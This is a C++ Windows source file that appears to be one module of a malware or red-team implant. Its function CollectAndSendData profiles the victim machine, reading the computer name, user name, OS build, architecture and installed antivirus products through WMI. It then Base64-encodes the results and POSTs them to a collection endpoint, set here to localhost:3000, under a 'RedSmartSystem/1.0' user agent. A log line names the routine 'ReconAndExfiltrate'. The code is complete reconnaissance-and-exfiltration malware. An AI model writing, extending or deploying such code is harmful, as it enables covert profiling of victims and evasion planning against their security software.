#include "recon.h"
#include <windows.h>
#include <iostream>
#include <string>
#include <sstream>
#include <fstream>
#include <wbemidl.h>
#include <wininet.h>
#include <wincrypt.h>

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

static void LogDebug(const std::string& msg) {
    std::ofstream ofs("debug_log.txt", std::ios::app);
    if (ofs.is_open()) {
        ofs << "[Task2] " << msg << std::endl;
    }
}

static std::string EscapeJSON(const std::string& s) {
    std::ostringstream o;
    for (char c : s) {
        if (c == '"' || c == '\\') o << '\\' << c;
        else o << c;
    }
    return o.str();
}

bool CollectAndSendData() {
    try {
        std::string pcName = "Unknown", userName = "Unknown", windowsVersion = "Unknown", architecture = "Unknown", antivirus = "";

        char compName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD compLen = sizeof(compName);
        if (GetComputerNameA(compName, &compLen)) pcName = compName;

        char usrName[UNLEN + 1];
        DWORD usrLen = sizeof(usrName);
        if (GetUserNameA(usrName, &usrLen)) userName = usrName;

        SYSTEM_INFO si;
        GetNativeSystemInfo(&si);
        switch (si.wProcessorArchitecture) {
            case PROCESSOR_ARCHITECTURE_AMD64: architecture = "x64"; break;
            case PROCESSOR_ARCHITECTURE_ARM: architecture = "ARM"; break;
            case PROCESSOR_ARCHITECTURE_ARM64: architecture = "ARM64"; break;
            case PROCESSOR_ARCHITECTURE_INTEL: architecture = "x86"; break;
            default: architecture = "Unknown"; break;
        }

        typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
        HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
        if (hMod) {
            RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
            if (fxPtr != nullptr) {
                RTL_OSVERSIONINFOW rovi = { 0 };
                rovi.dwOSVersionInfoSize = sizeof(rovi);
                if (fxPtr(&rovi) == 0) {
                    windowsVersion = std::to_string(rovi.dwMajorVersion) + "." + std::to_string(rovi.dwMinorVersion) + " Build " + std::to_string(rovi.dwBuildNumber);
                }
            }
        }

        IWbemLocator* pLoc = NULL;
        HRESULT hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
        if (SUCCEEDED(hres)) {
            IWbemServices* pSvc = NULL;
            hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\SecurityCenter2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
            if (SUCCEEDED(hres)) {
                hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
                if (SUCCEEDED(hres)) {
                    IEnumWbemClassObject* pEnumerator = NULL;
                    hres = pSvc->ExecQuery(bstr_t("WQL"), bstr_t("SELECT * FROM AntiVirusProduct"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
                    if (SUCCEEDED(hres)) {
                        IWbemClassObject* pclsObj = NULL;
                        ULONG uReturn = 0;
                        while (pEnumerator) {
                            HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
                            if (0 == uReturn) {
                                break;
                            }
                            VARIANT vtProp;
                            hr = pclsObj->Get(L"displayName", 0, &vtProp, 0, 0);
                            if (SUCCEEDED(hr)) {
                                std::wstring ws(vtProp.bstrVal);
                                std::string str(ws.begin(), ws.end());
                                if (!antivirus.empty()) antivirus += ", ";
                                antivirus += EscapeJSON(str);
                                VariantClear(&vtProp);
                            }
                            pclsObj->Release();
                        }
                        pEnumerator->Release();
                    }
                }
                pSvc->Release();
            }
            pLoc->Release();
        }
        
        if (antivirus.empty()) antivirus = "None or Unknown";

        std::string json = "{";
        json += "\"pcName\":\"" + pcName + "\",";
        json += "\"userName\":\"" + userName + "\",";
        json += "\"windowsVersion\":\"" + windowsVersion + "\",";
        json += "\"architecture\":\"" + architecture + "\",";
        json += "\"antivirus\":\"" + antivirus + "\"";
        json += "}";

        DWORD base64Len = 0;
        CryptBinaryToStringA((const BYTE*)json.data(), json.length(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64Len);
        std::string base64Data;
        if (base64Len > 0) {
            base64Data.resize(base64Len);
            CryptBinaryToStringA((const BYTE*)json.data(), json.length(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &base64Data[0], &base64Len);
            base64Data.resize(base64Len - 1); 
        }

        LogDebug("Sending Base64 payload to http://localhost:3000/receive");

        HINTERNET hSession = InternetOpenA("RedSmartSystem/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (hSession) {
            HINTERNET hConnect = InternetConnectA(hSession, "localhost", 3000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
            if (hConnect) {
                HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/receive", NULL, NULL, NULL, 0, 1);
                if (hRequest) {
                    std::string headers = "Content-Type: text/plain\r\n";
                    BOOL bResult = HttpSendRequestA(hRequest, headers.c_str(), headers.length(), (LPVOID)base64Data.c_str(), base64Data.length());
                    
                    if (bResult) {
                        DWORD statusCode = 0;
                        DWORD length = sizeof(DWORD);
                        HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &length, NULL);
                        LogDebug("HTTP Request succeeded. Status Code: " + std::to_string(statusCode));
                        
                        InternetCloseHandle(hRequest);
                        InternetCloseHandle(hConnect);
                        InternetCloseHandle(hSession);
                        return (statusCode == 200 || statusCode == 201);
                    } else {
                        LogDebug("HttpSendRequestA failed. Error Code: " + std::to_string(GetLastError()));
                    }
                    InternetCloseHandle(hRequest);
                } else {
                    LogDebug("HttpOpenRequestA failed. Error Code: " + std::to_string(GetLastError()));
                }
                InternetCloseHandle(hConnect);
            } else {
                LogDebug("InternetConnectA failed. Error Code: " + std::to_string(GetLastError()));
            }
            InternetCloseHandle(hSession);
        } else {
            LogDebug("InternetOpenA failed. Error Code: " + std::to_string(GetLastError()));
        }
        return false;
    } catch (...) {
        LogDebug("Exception caught during ReconAndExfiltrate");
        return false;
    }
}
